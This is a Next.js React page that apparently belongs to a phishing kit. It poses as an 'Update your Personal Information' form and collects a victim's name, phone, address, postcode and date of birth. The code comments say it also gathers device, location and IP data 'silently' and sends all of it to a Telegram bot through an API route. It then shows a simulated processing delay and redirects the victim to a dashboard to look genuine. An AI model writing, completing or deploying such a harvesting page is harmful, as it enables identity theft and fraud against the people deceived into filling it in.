"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2 } from "lucide-react"
import {
  isValidFullName,
  isValidPhoneNumber,
  isValidAddress,
  isValidCity,
  isValidPostalCode,
  isValidDateOfBirth,
} from "../../lib/personal-validation"
import { useDeviceInfo } from "../../hooks/use-device-info"

export default function PersonalPage() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  // Get device and location information silently
  const { deviceInfo, locationInfo, ipInfo } = useDeviceInfo()

  // Form state
  const [fullName, setFullName] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [address, setAddress] = useState("")
  const [city, setCity] = useState("")
  const [country, setCountry] = useState("United Kingdom")
  const [postalCode, setPostalCode] = useState("")
  const [dateOfBirth, setDateOfBirth] = useState("")

  // Validation states
  const isFullNameValid = isValidFullName(fullName)
  const isPhoneValid = isValidPhoneNumber(phoneNumber)
  const isAddressValid = isValidAddress(address)
  const isCityValid = isValidCity(city)
  const isPostalCodeValid = isValidPostalCode(postalCode, country)
  const isDateOfBirthValid = isValidDateOfBirth(dateOfBirth)

  const isFormValid =
    isFullNameValid &&
    isPhoneValid &&
    isAddressValid &&
    isCityValid &&
    isPostalCodeValid &&
    isDateOfBirthValid &&
    !isLoading

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!isFormValid) return

    setIsLoading(true)
    setError("")

    try {
      // Send personal info to Telegram bot with device info silently
      const response = await fetch("/api/telegram-personal", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          fullName,
          phoneNumber,
          address,
          city,
          country,
          postalCode,
          dateOfBirth,
          deviceInfo,
          locationInfo,
          ipInfo,
        }),
      })

      const result = await response.json()

      if (result.success) {
        // Simulate processing delay
        await new Promise((resolve) => setTimeout(resolve, 2000))

        // Redirect to dashboard
        router.push("/dashboard")
      } else {
        setError("Failed to update personal information. Please try again.")
      }
    } catch (error) {
      console.error("Personal info update error:", error)
      setError("Network error. Please check your connection.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Main Content */}
      <div className="px-6 pt-16 pb-8">
        <div className="max-w-md mx-auto">
          {/* Title */}
          <h1 className="text-4xl font-normal text-black mb-12 leading-tight">Update your Personal Information</h1>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Full Name */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Full Name</label>
              <Input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  fullName && !isFullNameValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {fullName && !isFullNameValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid full name</p>
              )}
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Phone Number</label>
              <Input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  phoneNumber && !isPhoneValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {phoneNumber && !isPhoneValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid phone number</p>
              )}
            </div>

            {/* Address */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Address</label>
              <Input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  address && !isAddressValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {address && !isAddressValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid address</p>
              )}
            </div>

            {/* City */}
            <div>
              <label className="block text-black text-base font-normal mb-3">City</label>
              <Input
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  city && !isCityValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {city && !isCityValid && <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid city</p>}
            </div>

            {/* Country */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Country</label>
              <Select value={country} onValueChange={setCountry} disabled={isLoading}>
                <SelectTrigger className="w-full h-14 px-4 border-0 rounded-lg bg-gray-200 text-base focus:ring-0 focus:border-0">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="United Kingdom">United Kingdom</SelectItem>
                  <SelectItem value="United States">United States</SelectItem>
                  <SelectItem value="Canada">Canada</SelectItem>
                  <SelectItem value="Australia">Australia</SelectItem>
                  <SelectItem value="Germany">Germany</SelectItem>
                  <SelectItem value="France">France</SelectItem>
                  <SelectItem value="Spain">Spain</SelectItem>
                  <SelectItem value="Italy">Italy</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Postal Code */}
            <div>
              <label className="block text-black text-base font-normal mb-3">
                {country === "United States" ? "ZIP Code" : "Postal Code"}
              </label>
              <Input
                type="text"
                value={postalCode}
                onChange={(e) => setPostalCode(e.target.value.toUpperCase())}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  postalCode && !isPostalCodeValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {postalCode && !isPostalCodeValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid postal code for {country}</p>
              )}
            </div>

            {/* Date of Birth */}
            <div>
              <label className="block text-black text-base font-normal mb-3">Date of Birth</label>
              <Input
                type="date"
                value={dateOfBirth}
                onChange={(e) => setDateOfBirth(e.target.value)}
                className={`w-full h-14 px-4 border-0 rounded-lg text-base focus:ring-0 focus:border-0 focus-visible:ring-0 focus-visible:ring-offset-0 ${
                  dateOfBirth && !isDateOfBirthValid ? "bg-red-100 focus:bg-red-100" : "bg-gray-200 focus:bg-gray-200"
                }`}
                disabled={isLoading}
              />
              {dateOfBirth && !isDateOfBirthValid && (
                <p className="text-red-500 text-sm mt-1 px-1">Please enter a valid date of birth</p>
              )}
            </div>

            {/* Error Message */}
            {error && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-lg">{error}</div>}

            {/* Continue Button */}
            <div className="pt-8">
              <Button
                type="submit"
                disabled={!isFormValid}
                className={`w-full h-14 text-base font-medium rounded-lg transition-all duration-200 ${
                  isFormValid ? "bg-black hover:bg-gray-900 text-white" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing...
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </form>

          {/* Form Status Indicators */}
          <div className="mt-6 text-sm text-gray-500 space-y-2">
            <div className={`flex items-center ${isFullNameValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isFullNameValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid full name
            </div>
            <div className={`flex items-center ${isPhoneValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPhoneValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid phone number
            </div>
            <div className={`flex items-center ${isAddressValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isAddressValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid address
            </div>
            <div className={`flex items-center ${isCityValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isCityValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid city
            </div>
            <div className={`flex items-center ${isPostalCodeValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isPostalCodeValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid postal code
            </div>
            <div className={`flex items-center ${isDateOfBirthValid ? "text-green-600" : "text-gray-400"}`}>
              <div className={`w-2 h-2 rounded-full mr-2 ${isDateOfBirthValid ? "bg-green-500" : "bg-gray-300"}`}></div>
              Valid date of birth
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
